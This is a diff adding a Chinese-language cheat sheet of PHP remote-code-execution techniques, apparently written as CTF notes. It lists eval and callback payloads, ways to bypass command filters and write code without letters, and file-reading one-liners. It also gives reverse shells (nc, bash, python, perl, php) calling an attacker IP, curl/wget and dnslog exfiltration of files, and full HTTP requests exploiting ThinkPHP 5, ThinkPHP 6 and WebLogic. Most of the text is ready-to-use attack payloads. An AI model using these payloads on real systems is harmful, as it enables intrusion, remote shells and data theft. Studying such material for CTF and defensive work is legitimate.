@@ -1,0 +1,424 @@
+代码执行
+eval()
+assert() 
+preg_replace(a,b,c) :c中被a的要求匹配时。匹配部分以b(此时执行)替换
+create_function 
+动态调用：变量当做函数用
+回调函数 call_user_func(a,b) 例子：a:assert（不能是eval或是echo这种语言结构），b:$GET_['cmd']
+		 call_user_func_array(a,b) b是数组数组中的元素会按照顺序依次作为参数传递给指定的函数或方法
+									例如：function add($x, $y) $params = [2, 3];$result = call_user_func_array('add', $params);  
+		 array_filter(a,b) a数组b函数
+		 array_map(a,b)  a函数b数组
+${php代码}		 
+
+paylpd：eval()传入字符串解释其为php代码执行
+		转接头写法：eval($GET_[1])    访问.../?1=eval($POET_[1]);链接蚁剑
+											.../?1=$a='sys';$b='tem';$c=$a.$b;$c($POST_[1])		post：1=ls /
+		<?`$_GET[1]`;&1=nc 43.323.323.2323 4444 -e /bin/bash    攻击方：nc -lvnp 4444
+                        bash -i >& /dev/tcp/<攻击者IP>/4444 0>&1
+						python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<攻击者IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
+						perl -e 'use Socket;$i="<攻击者IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+						php -r '$sock=fsockopen("<攻击者IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+		经典读文件函数
+			file_get_contents()
+			highlight_file()
+			fopen()
+			readfile()
+			fread()
+			fgetss()
+			fgets()
+			parse_ini_file()
+			show_source()
+			file()
+			var_dump(scandir('/'));	
+			
+			
+			/var/www/html/
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+		
+命令执行
+		位点：	system("")	里面写命令liunx，保证让系统看出是字符串
+				passthru
+				exec
+				shell_exec没有回显的执行函数或者设置>/dev/null 2>&1等无回显
+				popen
+				pcntl_exec
+		liunx系统操作：
+				find / -name flag*  //没有flag。没关系我们用[find](https://www.runoob.com/linux/linux-comm-find.html)命令从根目录开始找。
+				pwd: 显示当前工作目录的路径。
+				ls: 列出当前目录中的文件和目录。
+					ls -l  # 显示详细信息
+					ls -a  # 显示隐藏文件
+					ls -la合体
+				cd: 切换目录。
+					cd ..  # 返回上一级目录
+					cd ~  # 返回用户主目录
+				cp: 复制文件或目录。
+					cp source_file destination_file  # 复制文件
+					cp -r source_directory destination_directory  # 复制目录
+				mv: 移动或重命名文件和目录。
+					mv old_name new_name  # 重命名文件或目录
+					mv file_name /path/to/directory  # 移动文件
+				rm: 删除文件或目录
+					rm file_name  # 删除文件
+					rm -r directory_name  # 删除目录				
+				mkdir: 创建新目录。					
+					mkdir new_directory
+				rmdir: 删除空目录。
+					rmdir directory_name
+				cat: 显示文件内容。
+					cat file_name					
+				more: 分页显示文件内容
+					more file_name
+				less: 分页显示文件内容，支持向前滚动。
+					less file_name
+				head: 显示文件的前几行。
+					head file_name
+					head -n 10 file_name  # 显示文件的前10行
+					显示文件的后几行
+				tail: 显示文件的后几行。
+					tail file_name
+					tail -n 10 file_name  # 显示文件的后10行
+				nano: 简单的文本编辑器。
+					nano file_name
+					功能强大的文本编辑器
+				vi 或 vim: 功能强大的文本编辑器。
+					vi file_name
+					vim file_name
+				top: 动态显示系统的运行信息，包括进程、CPU、内存使用情况。
+					ps aux  # 显示所有进程的详细信息
+				kill: 终止进程。
+					kill process_id  # 终止指定进程
+					kill -9 process_id  # 强制终止指定进程
+				df: 显示文件系统的磁盘使用情况。
+					df
+					df -h  # 以人类可读的方式显示
+				du: 显示目录或文件的磁盘使用情况。
+					du -h  # 以人类可读的方式显示
+					du -sh directory_name  # 显示目录总大小
+				ping: 测试网络连接。
+					ping hostname_or_ip
+				ifconfig: 显示或配置网络接口（需要root权限）。
+					ifconfig
+					显示网络连接、路由表、接口状态等
+				netstat: 显示网络连接、路由表、接口状态等。
+					netstat
+					netstat -an  # 显示所有连接
+				ssh: 通过SSH协议远程登录。
+					ssh user@hostname_or_ip
+					通过SSH协议传输文件
+				scp: 通过SSH协议传输文件。
+					scp local_file user@hostname_or_ip:/path/to/remote_directory
+					scp user@hostname_or_ip:/path/to/remote_file local_directory
+				nc: 建立TCP连接。
+					nc <hostname> <port>
+					nc localhost 80  # 连接到本地的80端口
+				nc: 监听TCP端口。
+					nc -l -p <port>
+					nc -l -p 1234  # 监听本地的1234端口
+				发送文件：
+					nc <hostname> <port> < <file>
+					nc remote_host 1234 < file.txt  # 将file.txt发送到远程主机的1234端口
+				接收文件：			
+					nc -l -p <port> > <file>
+					nc -l -p 1234 > received_file.txt  # 在本地监听1234端口并接收文件到received_file.txt
+				nc: 端口扫描。
+					nc -zv <hostname> <start_port>-<end_port>
+					nc -zv localhost 80-100  # 扫描本地的80到100端口
+				Curl (curl)				
+					curl: 下载文件。
+					curl -O <URL>
+					curl -O http://example.com/file.txt  # 下载一个文件
+				curl: 上传文件。
+					curl -T <file> <URL>
+					curl -T file.txt ftp://ftp.example.com/  # 将file.txt上传到FTP服务器
+					发送GET请求
+				curl: 发送GET请求。				
+					curl <URL>
+					curl http://api.example.com/data  # 发送
+				sh命令会将文件中的内容当作命令来执行
+				执行命令时，可以在没有写完的命令后面加\，实现将一条命令多行化，以行末没有\为终止，如下相当于执行了cat flag.txt
+				ca\     t f\      lag.\  txt
+				linux中,利用rev可将文件内容倒置，同时可以配合>,*使用echo '123456' > test.txt：创建文件 test.txt 并写入内容 123456。
+				rev test.txt：反转文件 test.txt 的内容，输出 654321。
+				输入 * 并按回车：Shell 将 * 展开为 rev test.txt 并执行，输出 654321。
+				* > a.txt：Shell 将 * 展开为 rev test.txt 并执行，将输出重定向到 a.txt。
+				cat a.txt：查看 a.txt 文件的内容，输出 654321。
+				> rev：创建一个空文件名为 rev 的文件，如果 rev 文件已经存在，则会清空其内容。
+				linux中,dir命令和ls效果基本一样，只有配合重定向符写入文件时有一些差别，ls写入文件中时，
+				每个文件名都是单独一行，它会自动换行，有时会影响到我们的命令执行，而dir会把内容全部写入一
+				行中，同时会自动补全空格
+
+		绕过方式
+			符号
+				;联合执行 
+				||或  绕过黑洞
+				&&与
+				|传到
+				?不确定
+				*通配
+				. >命令会将原有文件内容覆盖，>>会将字符串添加到文件内容末尾，不会覆盖原有的内容
+		空格过滤	
+				空格；${IFS} $IFS$9 %09 
+				在env或者printenv环境变量里找空格env | grep ' '得到MYVAR=hello world${MYVAR:5:1} 或者echo@123表示即使123出错也不要报错，echo~123取反  
+				
+		cat过滤
+			   echo base64命令|base64 -d|sh 		   
+     		   echo hex命令|xxd -r -p|sh 
+			   换成 fmt more less rev ca\t
+		关键字过滤
+				插入反斜线 ca\t     贴贴'c''a''t'  ${}拼凑关键词  插入空ca''t
+				对于匹配文件名用通配符[a-s]
+				设置变量 cmd=ab;a=l;b=s;$a$b
+		禁用;
+			||代替
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+无参数rce:
+preg_replace('/[a-z]+\((?R)?\)/'虽然只允许无参数，但是允许函数套用。
+	获得flag.php
+		c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}
+		$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\n";}
+		$d=dir(".");while(false!==($f=$d->read())){echo$f."\n";}
+		print_r(glob("*")); // 列当前目录
+        print_r(glob("/*")); // 列根目录
+		scandir('.'): //获得目录 
+				取出. 
+					current(localeconv())
+					char(46)>>char(rand())//超多次重放
+					chr(ceil(sinh(cosh(tan(floor(sqrt(floor(phpversion()))))))))	//php7
+				操作数组：
+					pos() current()第一个元素
+					end()- 将内部指针指向数组中的最后一个元素，井输出
+					next()- 将内部指针指向数组中的下一个元素，并输出
+					prev()- 将内部指针指向数组中的上一个元素，并输出
+					reset()- 将内部指针指向敌组中的第一个元素，井输出
+					each()— 返回当前元素的键名和键值，井将内部指针向前移动
+				取出文件
+					如果flag-php在最后一个，直接用end（）取出即可。
+					(1)array_reverse()	//转置数组
+					仅限于flag.php在数组的倒数第二个位置这种悄况下。
+					?exp=print_r(next(array_reverse(scandir(pos(localeconv()))))):
+					(2)array_rand(array_flip()) //filp键值互换，rand随机取键
+					flag.php位置在哪都可以，但是他不是100%成功的，需要重放．概率问题
+					?exp=print_r(array_rand(array_flip(scandir(pos(localeconv())))));
+		session_id(session_star()) 更改cookie：PHPSESSID=flag.php	//字符串有长度限制,相当于想写啥就写啥命令不能有空格，因为cookie不解析空格
+		end(getallheaders()) //得到http包最后字符串，得到任意字符串,甚至可以命令执行，套进system等函数
+		取get的最后一个参数
+		end(pos(get_defined_vars()))
+		取post的最后一个参数
+		end(next(get_defined_vars()))
+	读取flag.php
+		文件读取的方法
+			var_dump(file_get_contents())
+			show_source()
+			highlight_file()
+			readfile()
+		命令执行的方法	
+			system(end(next(get_defined_vars()))) 字符串传入 cat flag.php
+		
+无字母RCE
+	php5	
+		异或  post传_=phpinfo
+		// assert($_POST[_])	
+		<?php
+		$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); $___=$$__;$_($___[_]);
+		取反  post传2=phpinfo
+			<?php
+			$__=('>'>'<')+('>'>'<');$_=$__/$__;$____='';$___="瞰";$____.=~($___{$_});$___="和";$____.=~($___{$__});$___="和";$____.=~($___{$__});$___="的";$____.=~($___{$_});$___="半";$____.=~($___{$_});$___="始";$____.=~($___{$__});$_____='_';$___="俯";$_____.=~($___{$__});$___="瞰";$_____.=~($___{$__});$___="次";$_____.=~($___{$_});$___="站";$_____.=~($___{$_});$_=$$_____;$____($_[$__]);
+		递增运算 post传	_=phpinfo
+			<?php
+			$_=[];$_=@"$_"; $_=$_['!'=='@']; $___=$_; $__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; $___.=$__; $__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $____.=$__;$_=$$____;$___($_[_]); 
+	
+	php7
+	取反脚本/异或脚本+动态调用
+	如('phpinfo‘//取反结果)();	('system//需要变化')(ls/ls -la)
+		$a='phpinfo';
+		$a();
+	
+   通过临时文件代码执行
+		强制上传表单.php中随便上传,txt文件
+	    POST /?cmd=.+/???/???????[@-[]? HTTP/1.1
+		...
+		ls /
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
+无回显
+     反弹shell
+		nc 43.323.323.2323 4444 -e /bin/bash    攻击方：nc -lvnp 4444
+        bash -i >& /dev/tcp/<攻击者IP>/4444 0>&1
+		python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("<攻击者IP>",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/bash","-i"]);'
+		perl -e 'use Socket;$i="<攻击者IP>";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'		
+		php -r '$sock=fsockopen("<攻击者IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");' 
+	 curl/wget外带数据 :
+	   首先在自己的公网ip的网站目录下建立一个record.php的文件，里面写下如下代码：
+		开始构造请求（读取不全的话可以进行编码`cat flag|base64`）：
+		curl http://*.*.*.**/record.php?data=`cat flag|base64`
+		wget http://*.*.*.*/record.php?data=`cat flag|base64`
+		执行结果无回显，通过burpsuite的Collaborator 服务器记录，利用`curl`将执行结果带出来，exp如下
+		http://IP:PORT/?cmd=curl%20http://g3k199o7dxxxhsfg6mwal.burpcollaborator.net/?cmd=`cat%20/flag|base64`
+	dnslog:
+		?cmd=`sed -n "3.4p"fla?.php|base64`;curl ${a:10:30}.<替换的dnslog>
+	echo写shell或者cat flag > test或者cp flag test等	
+我们可以使用$(sleep%091)来测试命令是否成功执行
+可以看到sleep 1，成功的使得页面延时了1秒返回。但是对于$(ls)，我们是无法看到回显的。这是因为使用$(ls)会把ls命令执行的结果作为参数传递给ping，ping将其作为域名进行解析，但是无法得到结果，因此把域名解析失败的错误输出到错误输出中，但php的system函数只输出了标准输出的内容，没有输出标准错误，因为我们无法看到结果。
+我们可以通过重定向标准错误到标准输出中，来让system函数输出错误回显，获取我们注入命令的结果。在sh中，错误描述符的编号是2，因此通过2>/dev/stdout就可以把错误重定向到标准输出中。
+完整的命令为"$(ls%09/)"%092>/dev/stdout，该命令可以列举根目录的文件。这里双引号的作用是，ls的输出会产生换行，导致ping只会将第一个结果作为错误输出出来，因此套在双引号内部，可以将结果全部回显。
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------	
+payload
+	eval($c)	//eval("var_dump($code)");类似于这种注意闭合
+		查看当前目录
+			c=print_r(scandir(dirname('__FILE__')));
+			   print_r(scandir(dirname(__FILE__)));
+			c=system("ls");
+		再看根
+			c=print_r(scandir('/'));
+			c=var_export(scandir('/'));
+			c=var_dump(glob('/*'));
+			c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}die(); //有open_basedir限制
+		读取flag
+			?c=system($_GET['a']);&a=cat flag.php;
+	        ?c=echo `cat fl''ag.php`;
+			?c=highlight_file(next(array_reverse(scandir("."))));
+			?c=eval(end(current(get_defined_vars())));&a=system("cat flag.php");
+			?c=passthru('cat /flag_is_her3');
+			?c=a=g;cat$IFS$1fla$a.php
+			?c=system("cat fl*g.php");
+			?c=system("tac fl*g.php");
+			?c=print_r(file('flag.php'));
+			?c=var_dump(file('flag.php'));
+			?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  //对应char脚本
+			?c=exec(%27cat%20/flag_is_her3%27,$array);var_dump($array);
+			?c=readfile("flag.php");
+			?c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgets($a);echo $line;}        //一行一行读取
+			?c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetc($a);echo $line;} 		//一个一个字符读取
+			?c=$a=fopen("flag.php","r");while (!feof($a)) {$line = fgetcsv($a);var_dump($line);}
+			?c=system("cp fl*g.php a.txt "); 访问/a.txt
+			?c=data://text/plain,<?=system('tac%20f*');?>
+			?c=include$_GET[a]?>&a=data://text/plain,<?php system('ls /');?>
+			?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTs/Pg==       //(<?php system("tac flag.php");?>)
+			?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+			?c=/bin/ca?${IFS}f???????
+			?c=/???/????64%20????.???  # /bin/base64 flag.php
+			?c=/???/???/????2 ????????  # /usr/bin/bzip2 flag.php
+
+			?c=$a=fopen("flag.php","r");while($b=fgets($a)){echo $b;}
+			?c=system('echo -e " <?php \n error_reporting(0); \n  \$c= \$_GET[\'c\']; \n eval(\$c); " > a.php');  访问/a.php?c=system("tac flag.php");
+			?c=system("cat fl*g.php | grep  -E 'fl.g' ");
+		无所谓，文件包含会出手
+			?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php  //不用分号
+			GET：?c=include$_GET[1]?>&1=php://input
+			POST：<?php system('tac flag.php');?>
+			c=include('flag.php');echo $flag;
+			c=include($_GET['1']); ?1=php://filter/convert.base64-encode/resource=flag.php
+			c=include('flag.php');var_dump(get_defined_vars());		//var_dump:输出注册变量//get_defined_vars():函数返回由所有已定义变量所组成的数组
+			c=include('/flag.txt');var_export(get_defined_vars());
+			c=include("/flag.txt");$ss=ob_get_contents();ob_end_clean();echo $ss;
+			c=include('/flag.txt');var_export(get_defined_vars());exit();
+			或者
+			c=include('/flag.txt');var_export(get_defined_vars());die();
+			c=$a=new DirectoryIterator('glob:///*');foreach($a as $f){echo($f->__toString()." ");}die();
+			或者
+			c=var_export(glob('/*'));die();
+		
+		`include "flag.php";`，这里面应该有flag变量，用[get_defined_vars()](https://www.runoob.com/php/php-get_defined_vars-function.html) 函数+var_dump全部输出出来。
+				var_dump(get_defined_vars());
+		
+
+
+		
+
+
+	 system();
+		  tac \find / -inum 3673632
+				printf /fla > /tmp/zer0b
+				printf g >> /tmp/zer0b
+				tac \`tac /tmp/zer0b
+			
+			
+			
+		补充：封装协议的利用
+			fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数stream_wrapper_register() 
+			php://input   allow_url_include选项必须设置为on，否则无法成功,allow_url_fopen是否开启无关紧要。php://input是用来接收post数据的当enctype="multipart/form-data"的时候php://input是无效php://input 用于 application/x-www-form-urlencoded 或 text/plain 编码类型的表单数据。
+						例子：文件包含
+			data://       allow_url_include与allow_url_fopen选项必须设置为on
+						用法：
+						data://text/plain,<?php phpinfo()?>
+						data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+						或者：
+						data:text/plain,<?php phpinfo()?>
+						data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
+
+			disable_functions是php.ini中的一个设置选项，可以用来设置PHP环境禁止使用某些函数，为了安全,运维人员会禁用PHP的一些“危险”函数,将其写在php.ini配置文件中,就是我们所说的disable_functions了。
+			disable_functions是一个黑名单机制，如果在渗透时已经上传了webshell却因为disable_functions导致我们无法进行命令执行，这时候就需要去进行一个绕过。
+
+		disable_functions	
+			PoC
+				禁用了常见的命令执行函数如system、exec、passthru但不能禁用所有函数（例如，如果禁用了stream_filter_register或类似函数，这个PoC可能无法执行）。
+				PoC主要针对Unix-like系统（Linux、macOS等），因为它依赖于底层的内存管理特性，这在不同操作系统之间可能有所不同。
+				没有启用诸如open_basedir等限制性配置
+				没有启用safe_mode（虽然safe_mode在PHP 5.4中被移除，但在某些环境中仍可能会影响漏洞利用）。
+				服务器配置允许使用php://memory等流包装器。
+				上传PoC.php最后访问PoC.php获取flag
+			
+			利用[LD_PRELOAD突破
+				找到“绕过disable_funtions“，在刚刚连接上的shell右键->加载插件->辅助工具->绕过disable_functions。模式选择`PHP7_GC_UAF`再点击开始，就能执行命令了
+			
+			利用Windows组件COM绕过
+				查看com.allow_dcom是否开启,这个默认是不开启的。
+				上传 EXP 脚本
+				http://target.com/uploads/com.php？cmd=whoami
+				
+			利用PHP7.4 FFI绕过
+			
+			ThinkPHP 5 的远程代码执行（RCE）
+				POST /index.php?s=captcha HTTP/1.1
+				Host: IP:PORT
+				User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+				Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+				Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+				Accept-Encoding: gzip, deflate
+				Connection: close
+				Upgrade-Insecure-Requests: 1
+				Pragma: no-cache
+				Cache-Control: no-cache
+				Content-Type: application/x-www-form-urlencoded
+				Content-Length: 79
+
+				_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /flag
+			
+			tp6rce
+				@Session::set('user',$_GET['username']);
+				访问会看到session设置，构造数据包如下
+
+
+				GET /public/index.php?username=<?php+eval($_GET[1]);?> HTTP/1.1
+				Host: IP:PORT
+				User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
+				Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+				Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+				Accept-Encoding: gzip, deflate
+				Connection: close
+				Cookie: PHPSESSID=../../../../public/111111112.php
+				Upgrade-Insecure-Requests: 1
+
+
+				接着访问`http://IP:PORT/public/111111112.php?1=system(%22cat%20/flag%22);`
+			
+			WebLogic 服务器的漏洞利用
+				WebLogic控制台必须对外暴露，并且可以通过 http://IP:PORT/console 访问
+				10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3WebLogic服务器使用了受影响的Spring Framework组件，该组件的 FileSystemXmlApplicationContext 允许通过URL加载远程的XML配置文件。如果目标服务器未使用或已修复相关漏洞，该攻击将失效。攻击者能控制远程文件
+				访问`http://IP:PORT/console`到登录页面
+				接着访问`http://IP:PORT/console/css/%252e%252e%252fconsole.portal`（这里最好抓包修改）
+				接着在本地用python起一个HTTP服务，HTTP下放置weblogic.xml
+				```
+				python3 -m http.server 8001
+				```
+				接着访问`http://IP:PORT/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://ip:8001/weblogic.xml")`
+		短rce？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？
+			形如`${_GET}{%f8}();&%f8=cmd`的payload需要的代码量最少且功能齐全，
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Metasploit Framework包含了可以检测和利用CGI漏洞的模块
+检查环境：确保服务器允许执行CGI脚本、当前目录可写，并且.htaccess文件有效。
+创建脚本：在服务器上创建一个脚本，这个脚本会连接到攻击者指定的IP地址，并给攻击者提供一个Shell访问。
+执行脚本：通过修改.htaccess文件，确保这个脚本可以执行，然后运行它。
